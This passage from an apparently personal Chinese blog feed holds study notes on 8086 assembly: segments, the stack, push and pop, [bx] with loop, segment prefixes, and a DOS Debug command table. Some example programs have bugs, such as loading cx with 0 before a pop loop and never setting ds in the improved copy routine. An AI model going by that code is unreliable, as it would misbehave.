bx,2<br>loop s ;以上将代码段0<del>16单元中的8个字型数据依次入栈<br>mov bx, 0<br>mov cx, 8<br>s0: pop cs: [bx]<br>add bx,2<br>loop s0;以上依次出栈8个字型数据到代码段0</del>16单元中<br>mov ax, 4c00h<br>int 21h<br>codesg ends</p><p>end start ;指明程序的入口在start处</p><h1 id="6-3将数据、代码、栈放入不同的段"><a href="#6-3将数据、代码、栈放入不同的段" class="headerlink" title="6.3将数据、代码、栈放入不同的段"></a>6.3将数据、代码、栈放入不同的段</h1><h2 id="但如果数据、栈和代码需要的空间超过64KB，就不能放在一个段中-一个段的容量不能大于64KB，是我们在学习中所用的8086模式的限制，并不是所有的处理器都这样-。"><a href="#但如果数据、栈和代码需要的空间超过64KB，就不能放在一个段中-一个段的容量不能大于64KB，是我们在学习中所用的8086模式的限制，并不是所有的处理器都这样-。" class="headerlink" title="但如果数据、栈和代码需要的空间超过64KB，就不能放在一个段中(一个段的容量不能大于64KB，是我们在学习中所用的8086模式的限制，并不是所有的处理器都这样)。"></a>但如果数据、栈和代码需要的空间超过64KB，就不能放在一个段中(一个段的容量不能大于64KB，是我们在学习中所用的8086模式的限制，并不是所有的处理器都这样)。</h2><p>assume cs:code ds:data ss:stack</p><p>data segment<br>     dw 0123H,0456H, 0789H,0abcH,0defH, 0fedH,0cbaH,0987H<br>data ends</p><p>stack segment<br>     dw 0,0,0,0,0,0,0,0<br>stack  ends</p><p>code segment<br>start: mov ax,stack<br>mov ss,ax<br>mov sp,16<br>mov ax,data<br>mov ds,ax<br>mov cx,8<br>s:push [bx]<br>add bx,2<br>loop s</p><p>mov bx,0<br>mov cx,0<br>s0:pop [bx]<br>add bx,2<br>loop s0<br>mov ax,4c00h<br>int 21h<br>code ends</p><p>end start</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;包含多个段的程序&quot;&gt;&lt;a href=&quot;#包含多个段的程序&quot; class=&quot;headerlink&quot; title=&quot;包含多个段的程序&quot;&gt;&lt;/a&gt;包含多个段的程序&lt;/h1&gt;&lt;h1 id=&quot;6-1在代码段中使用数据&quot;&gt;&lt;a href=&quot;#6-1在代码段中使用数据&quot; cla</summary>
      
    
    
    
    <category term="汇编" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编第五章</title>
    <link href="http://example.com/2020/02/13/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%BA%94%E7%AB%A0/"/>
    <id>http://example.com/2020/02/13/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%BA%94%E7%AB%A0/</id>
    <published>2020-02-13T15:25:22.000Z</published>
    <updated>2021-08-13T07:33:50.892Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BX-和loop指令"><a href="#BX-和loop指令" class="headerlink" title="[BX]和loop指令"></a>[BX]和loop指令</h1><h1 id="5-1-bx"><a href="#5-1-bx" class="headerlink" title="5.1 [bx]"></a>5.1 [bx]</h1><p>[bx]</p><p>assume cs:kk</p><p>kk segment</p><p>nn:   mov ax,2000H<br>      mov ds,ax<br>      mov al,[0]//等于mov al,0<br>      mov bl,[1]//等于mov bl,1<br>      mov cl,[3]<br>      mov dl,[4]   </p><p>mov ax,4c00H<br>int 21H</p><p>kk ends<br>end nn<br>用编辑器和debug写的命令不同<br>[bx]表示一个内存单元，它的偏移地址在bx中，比如<br>不能<br>mov ax,[0]<br>只能<br>mov bx,0<br>mov ax,[bx]<br>mov al,[bx]</p><h1 id="loop-循环"><a href="#loop-循环" class="headerlink" title="loop 循环"></a>loop 循环</h1><p>描述性符号”()”<br>(ax)=0010H<br>2000:1000处的内容为0010H<br>(21000H)=0010H<br>对于mov ax,[2]的功能<br>(ax)=((ds)*16+2)<br>对于mov [3],ax的功能<br>((ds)*16+2)=(ax)<br>对于add ax,2的功能<br>(ax)=(ax)+2<br>对于add ax,bx的功能<br>(ax)=(ax)+(bx)<br>对于push ax的功能<br>(sp)=(sp)-2<br>((ss)*16+(sp))=(ax)<br>对于pop ax的功能<br>(ax)=((ss)<em>16+(sp))<br>(sp)=(sp)+2<br>约定符号idata（我的数据//常量）<br><strong>mov ax,[idata]就代表mov ax,[1]、mov ax,[2]、mov ax,[3]等</strong><br><strong>mov bx,idata就代表mov bx,1、mov bx,2、mov bx,3等</strong><br><strong>mov ds,idata就代表mov ds,1.。。。但是这是错误的，非法的</strong><br>mov ax,[bx]<br>功能: bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将SA:EA处的数据送入ax中。<br>(ax)=(ds</em>16+(bx))<br>mov| bx ,ax<br>功能:bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处。<br>(ds *16 +(bx)) = (ax)</p><h1 id="inc-bx的含义是nx中的内容加1"><a href="#inc-bx的含义是nx中的内容加1" class="headerlink" title="inc bx的含义是nx中的内容加1"></a>inc bx的含义是nx中的内容加1</h1><p>mov bx，1<br>inc bx<br>bx=2</p><h1 id="5-2-loop指令"><a href="#5-2-loop指令" class="headerlink" title="5.2 loop指令"></a>5.2 loop指令</h1><p>指令的格式是:loop标号，CPU执行loop指令<br>(cx)=(cx)-1<br>判断cx中的值，不为零则转至标号处执行程序，如果为零则向下执行。<br>cx的值影响着loop指令的执行结果<br>Cx中存放循环次数<br>2^2</p><p>assume cs:code<br>code segment<br>     mov ax,2<br>     add ax,ax</p><p>mov ax,4c00H<br>int 21H<br>code ends</p><p>end</p><hr><p>2^3</p><p>assume cs:code</p><p>code segment<br>   mov ax,2<br>   add ax,ax<br>   add ax,ax</p><p>   mov ax,4c00H<br>   int 21H<br>code ends</p><p>end</p><hr><p>2^12<br>Assume cs:code<br>code segment<br>mov ax,2<br>mov cx,11<br>s: add ax,ax<br>loop s//s为标号</p><p>mov ax,4c00H<br>int 21H<br>code ends<br>end<br>(1)标号<br>在汇编语言中，标号代表一个地址，此程序中有一个标号s。它实际上标识了一个地址，这个地址处有一条指令: add ax,ax。<br>(2)loop s<br>CPU执行loop s的时候，要进行两步操作:<br>①(cx)=(cx)-1 ;<br>②判断cx中的值，不为0则转至标号s所标识的地址处执行(这里的指令是“add ax,ax)，如果为零则执行下一条指令(下一条指令是mov ax,4c00h)。<br>(3)以下三条指令<br>mov cx,1 1<br>s: add ax,ax<br>loop s<br>执行loop s时，首先要将(cx)减1，然后若(cx)不为0，则向前转至s处执行add ax,ax。所以，我们可以利用cx来控制add ax,ax的执行次数<br>loop指令<br>(1)在cx中存放循环次数;<br>(2)loop指令中的标号所标识地址要在前面;<br>(3)要循环执行的程序段，要写在标号和loop指令的中间。<br>mov cx,循环次数<br>s:<br>循玎执行的程序段<br>loop s//（cx=cx-1 判断cx是否为0）</p><h1 id="5-3在Debug中跟踪用loop指令实现的循环程序"><a href="#5-3在Debug中跟踪用loop指令实现的循环程序" class="headerlink" title="5.3在Debug中跟踪用loop指令实现的循环程序"></a>5.3在Debug中跟踪用loop指令实现的循环程序</h1><p>我们说的是“赋值”，就是说，让ax中的数据的值(数据的大小)和ffff:0006单元中的数据的值(数据的大小)相等。<br>8位数据01H和16位数据0001H的数据长度不一样，但它们的值是相等的。</p><h2 id="不能直接mov-ax-bx-要mov-al-bx-–mov-ah-0-否则会将ds-bx-和ds-bx-1-的值赋给ax"><a href="#不能直接mov-ax-bx-要mov-al-bx-–mov-ah-0-否则会将ds-bx-和ds-bx-1-的值赋给ax" class="headerlink" title="不能直接mov ax,[bx],要mov al,[bx]–mov ah,0,否则会将ds:[bx]和ds:[bx+1]的值赋给ax"></a>不能直接mov ax,[bx],要mov al,[bx]–mov ah,0,否则会将ds:[bx]和ds:[bx+1]的值赋给ax</h2><p>注意程序中的第一条指令mov ax,0ffffh。<br>我们知道大于9FFFH的十六进制数据A000H、A001H、…..、COOOH、COO1H、、FFFEH、FFFFH等，在书写的时候都是以字母开头的。</p><h2 id="而在3汇编源程序中，数据不能以字母开头，所以要在前面加0。"><a href="#而在3汇编源程序中，数据不能以字母开头，所以要在前面加0。" class="headerlink" title="而在3汇编源程序中，数据不能以字母开头，所以要在前面加0。"></a>而在3汇编源程序中，数据不能以字母开头，所以要在前面加0。</h2><p>调试多次用G命令也可以用P命令<br>-g XXXX<br>XXXX偏移地址<br>-p直接循环完</p><h1 id="5-4debug和汇编编译器MASM对指令的不同处理"><a href="#5-4debug和汇编编译器MASM对指令的不同处理" class="headerlink" title="5.4debug和汇编编译器MASM对指令的不同处理"></a>5.4debug和汇编编译器MASM对指令的不同处理</h1><p><strong>debug中数字默认16进制masm中默认10进制</strong><br>#5.5 loop和[bx]的联合应用<br>在做加法的时候，我们有两种方法:<br>(dx)=(dx)+内存中的8位数据:<br>(dl)=(dl)+内存中的8位数据;<br>第一种方法中的问题是两个运算对象的类型不匹配，第二种方法中的问题是结果有可能超界。<br>目前的方法(后面还有别的方法)就是得用一个16位寄存器来做中介。<br>mov ax,0ffffH<br>mov ds,ax ;设置(ds)=0ffffh<br>mov dx,0 ;初始化素累加寄存器，(dx)=0<br>mov al,ds: [0]<br>mov ah,0 ;(ax)=((ds)*16+0)= (0ffff0h)<br>add dx,ax ;向dx中加.上offffh:0单元的数值</p><p><strong>loop改进后</strong><br>mov ax,0ffffH<br>mov ds,ax<br>mov dx,0<br>mov bx,0<br>mov cx,000bH<br>s:  mov al,[bx]<br>mov ah,0<br>add dx,ax<br>inc bx<br>loop s<br>5.6 段前缀<br>指令“mov ax,[bx]”中 ，内存单元的偏移地址由bx给出，而段地址默认在ds中。//ds就称之为段前缀<br>我们可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器。<br>这些出现在访问内存单元的指令中，用于显式地指明内存单元的段地址的”ds:”、”cs:”、”ss:”或”es:”，在汇编语言中称为段前缀<br>mov ax,cs:[0]<br>mov bx,es:[0]</p><h1 id="5-7一段安全的空间"><a href="#5-7一段安全的空间" class="headerlink" title="5.7一段安全的空间"></a>5.7一段安全的空间</h1><p>在8086模式中，随意向一段内存空间写入内容是很危险的，因为这段空间中可能存放着重要的系统数据或代码。<br><strong>在一般的PC机中，DOS方式下，DOS和其他合法的程序一般都不会使用0:2000:2FF( 0:200h~0:2FFh) 的256个字节的空间。所以，我们使用这段空间是安全的。</strong></p><h1 id="5-8段前缀的使用"><a href="#5-8段前缀的使用" class="headerlink" title="5.8段前缀的使用"></a>5.8段前缀的使用</h1><p>将内存ffff:0~ ffff:b单元中的数据拷贝到0:200<del>0:20b单元中。<br>(1) 0:200</del>0:20b单元等同于0020:0 -0020:b单元，它们描述的是同一段内存空间:<br>(2)拷贝的过程应用循环实现，简要描述如下:<br>初始化: X=0<br>循环12次:<br>将fff:X单元中的数据送入0020:X(需要用一个寄存器中转)<br>X=X+1<br>(3)在循环中，源单f元ff:X和目标单元的0020:X的偏移地址X是变量。我们用bx来存放。<br>(4)我们用将0:200<del>0:20b用0020:0</del>0020:b描述，就是为了使目标单元的偏移地址和源始单元的偏移地址从同一数值0开始。</p><hr><p>assume cs:code<br>code segment<br>mov bx, 0; (bx)=0,偏移地址从o开始<br>mov cx,12; (cx)=12， 循环12次<br>s: mov ax,offffh<br>mov ds ,ax; (ds)=Offffh<br>mov dl, [bx] ; (dl)=((ds)*16+(bx))，将ffff :bx中的数据送入dl<br>mov ax,0020h<br>mov ds,ax ; (ds)=0020h<br>mov [bx],dl ; ((ds)*16+ (bx))=(dl)，将dl的数据送入0020:bx<br>inc bx ; (bx)=(bx) +1<br>loop s<br>mov ax,4c00h<br>int 21h<br>code ends<br>end</p><hr><p>改进<br>assume cs:code<br>code segment<br>mov ax,0ffffH<br>mov ax,0020h<br>mov es,ax<br>mov bx,0<br>mov cx,12<br>s: mov dl,[bx]<br>mov es:[bx],dl<br>inc bx<br>loop s</p><p>mov ax,4c00h<br>int 21h<br>code ends<br>end</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BX-和loop指令&quot;&gt;&lt;a href=&quot;#BX-和loop指令&quot; class=&quot;headerlink&quot; title=&quot;[BX]和loop指令&quot;&gt;&lt;/a&gt;[BX]和loop指令&lt;/h1&gt;&lt;h1 id=&quot;5-1-bx&quot;&gt;&lt;a href=&quot;#5-1-bx&quot; class</summary>
      
    
    
    
    <category term="汇编" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编第四章</title>
    <link href="http://example.com/2020/02/12/%E6%B1%87%E7%BC%96%E7%AC%AC%E5%9B%9B%E7%AB%A0/"/>
    <id>http://example.com/2020/02/12/%E6%B1%87%E7%BC%96%E7%AC%AC%E5%9B%9B%E7%AB%A0/</id>
    <published>2020-02-12T05:56:00.000Z</published>
    <updated>2021-08-13T07:33:45.804Z</updated>
    
    <content type="html"><![CDATA[<h1 id="4-1一个汇编语言程序（源程序）从写出到执行的过程"><a href="#4-1一个汇编语言程序（源程序）从写出到执行的过程" class="headerlink" title="4.1一个汇编语言程序（源程序）从写出到执行的过程"></a>4.1一个汇编语言程序（源程序）从写出到执行的过程</h1><p>编写-&gt;编译连接-&gt;执行<br>(2)使用汇编语言编译程序（MASM.EXE）对源程序文件中的源程序进行编译，产生目标文件；再用连接程序（LINK.EXE）对目标文件进行连接，生成可在操作系统中直接运行的课执行文件。<br>可执行文件中包含两部分<br>程序和数据<br>相关信息（程序大小）<br>(3)执行可执行文件中的程序<br>操作系统依照可执行文件中的描述信息，将可执行文件中的机器码和数据叫载入内存，并进行相关的初始化（比如：设置CS：IP指向第一条要执行的指令），然后由CPU执行程序。</p><h1 id="4-2-源程序"><a href="#4-2-源程序" class="headerlink" title="4.2 源程序"></a>4.2 源程序</h1><h2 id="INT-21H是DOS的中断调用"><a href="#INT-21H是DOS的中断调用" class="headerlink" title="INT 21H是DOS的中断调用"></a><em>INT</em> <em>21H</em>是DOS的中断调用</h2><p><a href="https://blog.csdn.net/chinazeze/article/details/1735621">https://blog.csdn.net/chinazeze/article/details/1735621</a></p><p>assume cs:codesg</p><p>codesg segment<br>  start: mov ax,0123H<br>         mov bx,0456H<br>         add ax,bx<br>         add ax,ax<br>         mov ax,4c00h<br>         int 21h</p><p>codesg ends<br>end start</p><p>汇编指令<br>有对应的机器码的指令，可以被编译位机器指令，最终为CPU所执行<br>// mov add sub jmp<br>伪指令<br>除了汇编指令，别的都是伪指令<br>没有对应的机器码的指令，最终不被CPU所执行<br>伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作<br>XXX segment<br>XXX ends<br>end //是一个编译程序的结束标记，记得在结尾加<br>assume //寄存器与段的关联假设<br>定义一个段<br>segment和ends是一对成对使用的伪指令，这是在写可被编译器编译的汇编程序时，必要用到的一对伪指令。<br>segment和ends的功能是定义一个段，segment说明一个段的开始，ends说明一个段结束。<br>一个汇编程序是由多个段组成的，这些段被用来存放代码、数据或当作栈空间来使用。<br>汇编源程序:<br>      伪指令 （编译器处理）<br>      汇编指令（编译为机器码）</p><p>源程序文件中的所有内容称为源程序，将源程序中最终由计算机执行处理的指令或数据称为程序。<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210719101519.jpeg" alt="17xmEn.jpg"><br>标号<br>标号指代了一个地址</p><p>Codesg:放在segment的前面，作为一个段的名称<br>  assume name<br>  name segment<br>  mov ax,2<br>  add ax,ax<br>  add ax,ax<br>  name ends<br>  end</p><p>DOS中的程序运行<br>DOS是一个但任务操作系统。<br>程序返回<br>应该在程序的末尾添加返回的程序段<br>mov ax,4c00H<br>int 21H<br>这两条指令所实现的功能就是程序返回。<br>Masm 1.asm;<br>Link 1.obj;<br>1.exe<br>连接的作用<br>当源程序很大时，可以将它分为多个源程序文件来编译，每个源文件编译成为目标文件后，再用连接程序将它们连接到一起，生成一个可执行文件；<br>程序中调用了某个库文件中的子程序，需要将这个库文件的该程序生成的目标文件连接到一起，生成一个可执行文件；</p><p>对于连接的过程，可执行文件是我们要得到的最终结果</p><h1 id="4-8可执行文件中的程序装入内存并运行的原理"><a href="#4-8可执行文件中的程序装入内存并运行的原理" class="headerlink" title="4.8可执行文件中的程序装入内存并运行的原理"></a>4.8可执行文件中的程序装入内存并运行的原理</h1><p>在DOS中，可执行文件中的程序P1若要运行，必须有一个正在运行的程序P2，将P1从可执行文件中加载入内存，将CPU的控制权交给它，P1才能得以运行；<br>当P1运行完毕后，应该将CPU的控制权交给使它得以运行的程序P2</p><p>操作系统的外壳<br>操作系统是由多个功能模块组成的庞大、复杂的软件系统。任何通用的操作系统，都要提供一个称为shell（外壳）的程序，用户（操作人员）使用这个程序来操作计算机系统工作。<br>（cmd）</p><p><strong>编程-&gt;1.asm-&gt;编译-&gt;1.obj-&gt;连接-&gt;1.exe-&gt;加载-&gt;内存中的程序-&gt;运行</strong><br>  Edit         masm       link        command            cpu</p><h1 id="4-9程序执行过程的跟踪"><a href="#4-9程序执行过程的跟踪" class="headerlink" title="4.9程序执行过程的跟踪"></a>4.9程序执行过程的跟踪</h1><p>Debug可以将程序载入内存，设置CS:IP指向程序的入口，但Debug并不放弃对CPU的控制，这样，我们就可以使用Debug的相关命令来单步执行程序，查看每一条指令的执行结果<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210719101532.jpeg" alt="17xdC6.jpg"><br>PSP占256（100H）字节，所以程序的物理地址是：<br>SA<em>16+0+256=SA</em>16+16*16=（SA+16)*16+0<br>用u命令查看一下其他指令<br>-u 103e:0 100H<br>用T命令来单步执行与查看每条指令<br><strong>到了int 21，我们要用P命令执行</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;4-1一个汇编语言程序（源程序）从写出到执行的过程&quot;&gt;&lt;a href=&quot;#4-1一个汇编语言程序（源程序）从写出到执行的过程&quot; class=&quot;headerlink&quot; title=&quot;4.1一个汇编语言程序（源程序）从写出到执行的过程&quot;&gt;&lt;/a&gt;4.1一个汇编语言程序</summary>
      
    
    
    
    <category term="汇编" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编第三章</title>
    <link href="http://example.com/2020/01/16/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <id>http://example.com/2020/01/16/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%B8%89%E7%AB%A0/</id>
    <published>2020-01-16T04:14:31.000Z</published>
    <updated>2021-08-13T07:33:40.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据都不能和段地址发生直接替换，要借用寄存器"><a href="#数据都不能和段地址发生直接替换，要借用寄存器" class="headerlink" title="数据都不能和段地址发生直接替换，要借用寄存器"></a>数据都不能和段地址发生直接替换，要借用寄存器</h1><h1 id="Debug的T命令在执行修改寄存器SS的指令时，下一条指令也要紧接着被执行"><a href="#Debug的T命令在执行修改寄存器SS的指令时，下一条指令也要紧接着被执行" class="headerlink" title="Debug的T命令在执行修改寄存器SS的指令时，下一条指令也要紧接着被执行"></a>Debug的T命令在执行修改寄存器SS的指令时，下一条指令也要紧接着被执行</h1><h1 id="3-1-内存中字的存储"><a href="#3-1-内存中字的存储" class="headerlink" title="3.1  内存中字的存储"></a>3.1  内存中字的存储</h1><p>存放方式<br>在0地址处开始存放20000（4E20H）<br>0   | 20H<br>1   | 4EH<br>2   | 12H<br>3   | 00H<br>4   |<br>5   |<br>上低下高<br>（字型要考虑两个字节）<br>（字节型数要考虑1个字节）<br>0地址单元中存放的字节型数据为 20H<br>0地址字单元中存放的字型数据为 20000（4E20H）<br>2地址字单元中存放的字节型数据为12H<br>2地址字单元中存放的字型数据为0012H<br>1地址字单元中存放的字型数据为 124EH</p><h1 id="3-2-DS和-address"><a href="#3-2-DS和-address" class="headerlink" title="3.2  DS和[address]"></a>3.2  DS和[address]</h1><p>8086CPU中有一个DS寄存器，通常用来存放要访问的数据的段地址<br>将数据直接送入寄存器 mov ax,2<br>将一个寄存器中的内容送入另一个寄存器中 mov bx,ax<br>还可以将一个内存单元中的内容送入一个寄存器。mov a1,[0]<br>mov 寄存器名,内存单元地址<br>[…]表示一个内存单元,[…]中的0表示内存单元的偏移地址<br>执行指令时，8086CPU自动取DS中的数据为内存单元的段地址<br>不能mov ds,1000H<br>只能 mov bx,1000H<br>     mov ds,bx<br>数据-&gt;通用寄存器-&gt;段寄存器<br>将al中的数据送入内存单元10000H<br>mov bx,1000H<br>mov ds,bx<br>mov [0],al</p><h1 id="3-3-字的传送"><a href="#3-3-字的传送" class="headerlink" title="3.3  字的传送"></a>3.3  字的传送</h1><p>8086CPU是16位结构，有16根数据线，所以，可以 一次性传送16位的数据，也就是一次性传送一个字。<br>一个字=两个字节</p><h1 id="3-4-mov-add-sub"><a href="#3-4-mov-add-sub" class="headerlink" title="3.4  mov add sub"></a>3.4  mov add sub</h1><p>Sub是减法</p><h1 id="3-5-数据段"><a href="#3-5-数据段" class="headerlink" title="3.5  数据段"></a>3.5  数据段</h1><p>可以根据需要将一组内存单元定义为一个段（可以是代码段、数据段等）<br>可以将一组长度为N（N&lt;=64K）、地址连续、起始地址为16的倍速的内存单元当作专门存储数据的内存空间，从而定义了一个数据段<br>123B0H-123B9H<br>段地址：123BH<br>长度：10字节<br>如何访问数据段中的数据<br>将ds指到头<br>累加123B0H的前三个字节单元的数据<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210719094734.jpeg" alt="ljWzQS.jpg"><br>累加123B0H的前三个字型单元的数据<br><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210719094738.jpeg" alt="ljfPds.jpg"></p><h1 id="3-6-栈"><a href="#3-6-栈" class="headerlink" title="3.6  栈"></a>3.6  栈</h1><p>栈是一种具有特殊的访问方式的存储空间。它的特殊性就在于，最后进去这个空间的数据，最先出去<br>入栈：将一个新的元素放到栈顶；<br>出栈：从栈顶取出一个元素。<br>操作原则：LIFO</p><h1 id="3-7-CPU提供的栈机制"><a href="#3-7-CPU提供的栈机制" class="headerlink" title="3.7  CPU提供的栈机制"></a>3.7  CPU提供的栈机制</h1><p>CPU都有栈的设计<br>push是入栈<br>pop是从栈顶<br>push ax ：将寄存器ax中的数据送入栈中（从栈底开始添入）<br>pop ax  ：从栈顶取出数据送入ax（取出后将栈顶数据存在，是覆盖的）<br>8086CPU的入栈和出栈操作都是以字型为单位进行的<br>字型是两个单元<br>8086CPU中有两个寄存器：<br>段寄存器SS 存放栈顶的段地址<br>寄存器SP 存放栈顶的偏移地址<br><strong>任何时刻，SS：SP指向栈顶元素</strong><br>例子：<br>push ax<br>(1)SP=SP-2;<br>(2)将ax中的内容送入SS:SP指向的内存单元出,SS:SP此时指向新栈顶<br>将10000H-1000FH当作栈，初始状态是空<br>SS=1000H  SP=0010H</p><h1 id="格式化就是指向0，数据并没有删除，只是等待被覆盖，所以要多次覆盖在格式化，才能清除干净"><a href="#格式化就是指向0，数据并没有删除，只是等待被覆盖，所以要多次覆盖在格式化，才能清除干净" class="headerlink" title="格式化就是指向0，数据并没有删除，只是等待被覆盖，所以要多次覆盖在格式化，才能清除干净"></a>格式化就是指向0，数据并没有删除，只是等待被覆盖，所以要多次覆盖在格式化，才能清除干净</h1><h1 id="3-8-栈顶超界的问题"><a href="#3-8-栈顶超界的问题" class="headerlink" title="3.8 栈顶超界的问题"></a>3.8 栈顶超界的问题</h1><p>栈顶超界是危险的，入栈出栈时的不小心，而将这些数据、代码意外地改写，将会引发一连串的错误。<br>8086CPU不保证对栈的操作不会超界。<br>8086CPU只知道栈顶在何处（由SS：SP），而不知道读者安排的栈空间有多大。</p><h1 id="3-9-push、pop指令"><a href="#3-9-push、pop指令" class="headerlink" title="3.9 push、pop指令"></a>3.9 push、pop指令</h1><p>Push 寄存器：将一个寄存器中的数据入栈<br>Pop  寄存器：出栈，用一个寄存器接收出栈的数据<br>Push ax<br>Pop bx<br>Push 段寄存器：将一个段寄存器中的数据入栈<br>Pop  段寄存器：出栈，用一个段寄存器接收出栈的数据<br>Push ds<br>Pop es<br>Push 内存单元：将一个内存单元处的字入栈<br><strong>栈的操作都是以字为单位</strong><br>Pop  内存单元：出栈，用一个内存字单元接收出栈的数据<br>Push [0]<br>Pop [2]<br>CPU段地址都是从ds中获得</p><p><strong>Xor 异或</strong><br><strong>Xor ax,ax</strong><br><strong>一样等于0</strong><br><strong>不一样等于1</strong></p><h1 id="3-10-栈段"><a href="#3-10-栈段" class="headerlink" title="3.10 栈段"></a>3.10 栈段</h1><p>我们可以将长度为N(N&lt;=64K)的一组地址连续、起始地址为16的倍数的内存单元，当作栈在用，从而定义了一个栈段。</p><p>10000H-1FFFFH这段空间当作栈段，初始状态栈是空，此时SS=1000H,SP=0</p><p>10000H-1FFFFH这段空间当作栈段，SS=1000H，栈空间大小为64KB，栈最底部的字单元地址为1000:FFFE<br>任何时刻，SS:SP指向栈顶，当栈中只有一个元素的时候，SS=1000H，SP=FFFEH<br>Push和pop只能修改SP，SS是不发生改变的</p><p>一个栈段的容量最大为64KB</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;数据都不能和段地址发生直接替换，要借用寄存器&quot;&gt;&lt;a href=&quot;#数据都不能和段地址发生直接替换，要借用寄存器&quot; class=&quot;headerlink&quot; title=&quot;数据都不能和段地址发生直接替换，要借用寄存器&quot;&gt;&lt;/a&gt;数据都不能和段地址发生直接替换，要借用寄</summary>
      
    
    
    
    <category term="汇编" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>debug命令</title>
    <link href="http://example.com/2020/01/11/debug%E5%91%BD%E4%BB%A4/"/>
    <id>http://example.com/2020/01/11/debug%E5%91%BD%E4%BB%A4/</id>
    <published>2020-01-11T03:16:21.000Z</published>
    <updated>2021-08-13T07:34:56.899Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>Debug命令</th><th align="center">参数</th><th align="right">功能</th></tr></thead><tbody><tr><td>A</td><td align="center">[地址]</td><td align="right">输入汇编指令</td></tr><tr><td>C</td><td align="center">[范围] 起始地址</td><td align="right">对由“范围”指定的区域与“起始地址”指定的同大小区域进行比较，显示不相同的单元</td></tr><tr><td>D</td><td align="center">[范围]</td><td align="right">显示指定范围内的内存单元内容</td></tr><tr><td>E</td><td align="center">地址  字节值表</td><td align="right">用值表中的值替换从“地址”开始的内存单元内容</td></tr><tr><td>F</td><td align="center">范围  字节值表</td><td align="right">用指定的字节值表来填充内存区域</td></tr><tr><td>G</td><td align="center">[=起始地址][断点地址]</td><td align="right">从起点(或当前地点)开始执行，到终点结束</td></tr><tr><td>H</td><td align="center">数值1  数值2</td><td align="right">显示二个十六进制数值之和、差</td></tr><tr><td>I</td><td align="center">端口地址</td><td align="right">从端口输入</td></tr><tr><td>L</td><td align="center">[地址 [驱动器号 扇区 扇区数]]</td><td align="right">从磁盘读</td></tr><tr><td>M</td><td align="center">范围  地址</td><td align="right">把“范围”内的字节值传送到从“地址”开始的单元</td></tr><tr><td>N</td><td align="center">文件标识符 [文件标识符…]</td><td align="right">指定文件名，为读/写文件做准备</td></tr><tr><td>O</td><td align="center">端口地址  字节值</td><td align="right">向端口输出</td></tr><tr><td>P</td><td align="center">[=地址]  [指令数]</td><td align="right">按执行过程，但不进入子程序调用或软中断</td></tr><tr><td>Q</td><td align="center"></td><td align="right">退出DEBUG，不保存正在调试的文件</td></tr><tr><td>R</td><td align="center">[寄存器名]</td><td align="right">显示和修改寄存器内容</td></tr><tr><td>S</td><td align="center">范围  字节值表</td><td align="right">在内存区域内搜索指定的字节值表。如果找到，显示起始地址，否则，什么也不显示</td></tr><tr><td>T</td><td align="center">[=地址]  [指令数]</td><td align="right">跟踪执行，从起点(或当前地点)执行若干条指令</td></tr><tr><td>U</td><td align="center">[范围]</td><td align="right">反汇编，显示机器码所对应的汇编指令</td></tr><tr><td>W</td><td align="center">[地址 [驱动器号  扇区 扇区数]]</td><td align="right">向磁盘写内容，(BX、CX)为写入字节数</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Debug命令&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;参数&lt;/th&gt;
&lt;th align=&quot;right&quot;&gt;功能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;A&lt;/td&gt;
&lt;td align=&quot;</summary>
      
    
    
    
    <category term="汇编" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96/"/>
    
    
  </entry>
  
  <entry>
    <title>汇编第二章2</title>
    <link href="http://example.com/2020/01/10/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%BA%8C%E7%AB%A02/"/>
    <id>http://example.com/2020/01/10/%E6%B1%87%E7%BC%96%E7%AC%AC%E4%BA%8C%E7%AB%A02/</id>
    <published>2020-01-10T14:18:42.000Z</published>
    <updated>2021-08-13T07:33:35.298Z</updated>
    
